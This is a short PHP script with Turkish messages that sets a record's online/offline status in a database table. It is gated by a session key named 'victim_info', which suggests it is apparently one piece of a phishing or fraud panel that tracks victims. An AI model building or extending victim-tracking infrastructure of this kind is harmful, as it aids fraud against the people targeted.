<?php   
    include 'db.php';
    header("Content-Type: application/json");
    session_start();
    $id = @$_GET['id'];
    try {
        if(@$_SESSION['victim_info']) {
            $status = htmlspecialchars($_POST['status']);
            if($status == "online") {
                $stmt = $dbh->prepare("UPDATE info SET active_status = '3' WHERE id = :id");
                $stmt->bindParam(':id', $id);
                $stmt->execute();
                echo json_encode(array("success" => "Güncellendi"));
            } else if($status == "offline") {
                $stmt = $dbh->prepare("UPDATE info SET active_status = '2' WHERE id = :id");
                $stmt->bindParam(':id', $id);
                $stmt->execute();
                echo json_encode(array("success" => "Güncellendi"));
            } else {
                echo json_encode(array("error" => "Yetkisiz işlem."));
            }
    
        } else {
            echo json_encode(array("error" => "Yetkisiz işlem."));
        }
    } catch (Exception $e) {
        echo 'Caught exception: ',  $e->getMessage(), "\n";
    }

?>